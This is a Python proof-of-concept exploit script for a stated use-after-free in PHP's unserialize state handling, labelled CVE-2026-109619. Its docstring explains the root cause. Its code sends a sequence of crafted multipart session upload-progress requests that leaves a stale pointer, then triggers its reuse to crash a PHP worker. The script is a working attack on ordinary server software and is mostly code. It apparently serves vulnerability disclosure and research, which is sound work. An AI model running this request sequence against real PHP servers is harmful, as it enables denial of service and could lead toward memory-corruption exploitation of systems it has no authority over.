#!/usr/bin/env python3
"""
Copyright 2026 Joshua Rosato.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

Author: Joshua Rosato.

CVE-2026-109619 PoC - stale global state (use-after-free) in PHP.

Root cause (php-src, pre-patch):
  ext/standard/var_unserializer.re: php_var_unserialize_init() reuses
  BG(unserialize).data when BG(unserialize).level != 0.  If a request is
  interrupted between PHP_VAR_UNSERIALIZE_INIT() and PHP_VAR_UNSERIALIZE_DESTROY()
  (e.g. an OOM bailout inside unserialize()), BG(unserialize) keeps pointing at
  request-owned memory that is freed when the request ends.  The next request
  that unserializes *before* RINIT (the session upload progress handler runs in
  php_request_startup(), before RINIT) reuses the dangling pointer.

Sequence:
  1. create a session file (upload progress handler writes it)
  2. producer request: OOM inside unserialize()  -> stale BG(unserialize)
  3. consumer request: multipart upload-progress POST -> stale pointer is used

Usage:  python3 poc_stale_state.py --url http://127.0.0.1:9018/ --sid <sessionid>
"""
import argparse
import sys
import urllib.request
import urllib.error

BOUNDARY = "----PoCStaleState"


def multipart(parts, sid, progress_key, files=1, file_name_len=16):
    out = []
    out.append(f"--{BOUNDARY}")
    out.append('Content-Disposition: form-data; name="PHPSESSID"')
    out.append("")
    out.append(sid)
    out.append(f"--{BOUNDARY}")
    out.append('Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"')
    out.append("")
    out.append(progress_key)
    for i in range(files):
        name = ("f%d_" % i) + "A" * file_name_len
        out.append(f"--{BOUNDARY}")
        out.append(f'Content-Disposition: form-data; name="{name}"; filename="{name}.txt"')
        out.append("Content-Type: text/plain")
        out.append("")
        out.append("x")
    out.append(f"--{BOUNDARY}--")
    return "\r\n".join(out).encode()


def post(url, body, sid, timeout=60):
    req = urllib.request.Request(url, data=body, headers={
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "Content-Length": str(len(body)),
    })
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(400)
    except urllib.error.HTTPError as e:
        return e.code, e.read(400)
    except Exception as e:
        return None, str(e).encode()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:9018/")
    ap.add_argument("--sid", default="abcdef0123456789abcdef0123456789")
    ap.add_argument("--key", default="poc")
    args = ap.parse_args()

    base = args.url if args.url.endswith("/") else args.url + "/"

    print("[1] create session file")
    st, body = post(base + "index.php", multipart([], args.sid, args.key, files=1),
                    args.sid)
    print(f"    -> {st} {body[:120]!r}")

    print("[2] producer: OOM inside unserialize() (leaves BG(unserialize) stale)")
    st, body = post(base + "producer.php", multipart([], args.sid, args.key, files=1),
                    args.sid)
    print(f"    -> {st} {body[:200]!r}")

    print("[3] consumer: upload-progress POST unserializes before RINIT")
    st, body = post(base + "consumer.php", multipart([], args.sid, args.key, files=1),
                    args.sid)
    print(f"    -> {st} {body[:200]!r}")
    if st is None:
        print("    !! connection lost - worker crashed (UAF)")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
